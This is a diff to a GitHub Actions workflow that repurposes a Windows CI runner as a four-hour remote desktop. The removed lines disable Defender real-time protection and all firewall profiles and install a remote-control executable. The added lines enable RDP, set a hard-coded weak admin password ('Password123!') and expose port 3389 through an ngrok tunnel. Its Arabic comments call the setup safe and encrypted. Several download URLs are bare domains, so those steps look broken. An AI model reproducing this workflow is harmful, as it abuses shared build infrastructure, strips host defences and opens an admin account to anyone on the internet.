@@ -1,4 +1,4 @@
-name: GetScreen Windows (4H)
+name: Windows RDP (4H)
 
 on:
   workflow_dispatch:
@@ -8,17 +8,24 @@ jobs:
     runs-on: windows-latest
 
     steps:
-      - name: Downloading & Setting Up
+      - name: Setting Up RDP Connection
         shell: powershell
         run: |
-          Set-MpPreference -DisableRealtimeMonitoring $true
-          Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-          $url = "https://github.com"
-          Invoke-WebRequest -Uri $url -OutFile "getscreen.exe"
-          Start-Process -FilePath ".\getscreen.exe" -ArgumentList "-install -email jordanegaylord8@gmail.com" -Wait
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          net user runneradmin "Password123!"
+          
+          # تحميل وتثبيت أداة Ngrok الرسمية الآمنة
+          Invoke-WebRequest -Uri "https://equinox.io" -OutFile "ngrok.zip"
+          Expand-Archive -Path "ngrok.zip" -DestinationPath "."
+          
+          # تفعيل الاتصال المشفر
+          .\ngrok.exe config add-authtoken "${{ secrets.NGROK_AUTH_TOKEN }}"
+          Start-Process -FilePath ".\ngrok.exe" -ArgumentList "tcp 3389"
 
-      - name: Time Counter
+      - name: Keep Alive Counter
         shell: cmd
         run: |
-          python -c "import time; time.sleep(14400)"
+          python -c "import time; print('RDP is running successfully...'); time.sleep(14400)"
+
 
